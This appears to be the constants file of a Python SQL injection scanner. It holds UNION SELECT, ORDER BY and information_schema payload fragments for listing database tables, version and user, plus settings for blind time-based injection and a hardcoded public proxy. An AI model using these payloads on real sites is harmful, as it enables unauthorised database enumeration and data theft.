#variaveis e Constante
ACTION_VALIDATE  = False
REQUEST_TIMEOUT  = 10
INPUTS_NUBERS = 0
TARGET_VULNERABLE = False
INITIAL_FORM_COUNT_VALUE = 1
INITIAL_COUNT_VALUE = 0
AVARAGE_TIME_BASED_SQLI = 0.99 ## uma conexão é estável quando somente e somente se não houver perdas de pacotes e o valor do jiiter for zero ou próximo de zero (https://codepre.com/pt/como-medir-la-estabilidad-de-su-conexion-a-internet-desde-su-pc.html)
## default time delay for sqli blind time-based 
DEFAULT_SQLI_TIME_BASED_TIME = 5
## counter for succed sqli bind time-based 
SQLI_BLIND_TIME_BASED_SUCCED_COUNT = 0
DEFAULT_MYSQL_PORT = 3306
DEFAULT_TIMEOUT = 10
PYTHON_VERSION = 3
HEADERS = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
    }
SUPPORTED_HTTP_BYSNESS = ['TRACE', 'x-frame-options', 'X-Content-Type-Options', 'X-XSS-Protection', 'Strict-Transport-Security']
PROXIES_ = {'http': 'http://217.219.61.6:8080', 'https': 'https://217.219.61.6:8080'}#  Fonte de servidor proxy usado configurado  https://spys.one/en/
FIND_NUMBER_OF_COLLUM_IN_TABLE = '+ORDER+BY+'
VULNERABLE_COLLUM_DETECTING = "+UNION+SELECT+" 
CHECKING_FOR_DBMS_VERSION = "version()";
DATABASE_NAME = "database()";
GET_TABLES_NAMES = "(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())" 
GET_CURRENT_USER = "(SELECT+CURRENT_USER)"
OS = ['ubuntu', 'kali', 'windows', 'macos', 'oracle solaris', 'fedora','susi', 'red hat' ]
MYSQL_SERVER_VERSIONS = ['8.0.28', '8.0.22', '8.0.30', '8.0.29', '8.0.27', '8.0.26', '8.0.25', '8.0.21' ]
NEW_FORM_PARAMETERS = '''
<form">
<fieldset>
<legend>Login</legend>
<p></p><div class="alert-box alert">Wrong user name or password.<a href="" class="close">×</a></div><p></p>
<p>Username: <input type="text" name="username" id="username" size="25" value="sdadasdas"></p>
<p>Password: <input type="password" name="passwd" id="passwd" size="25" value="sdadasdas"></p>
<p><input type="submit" class="small button" name="submit" id="submit" value="Submit"><br></p>
</fieldset>
</form>
'''


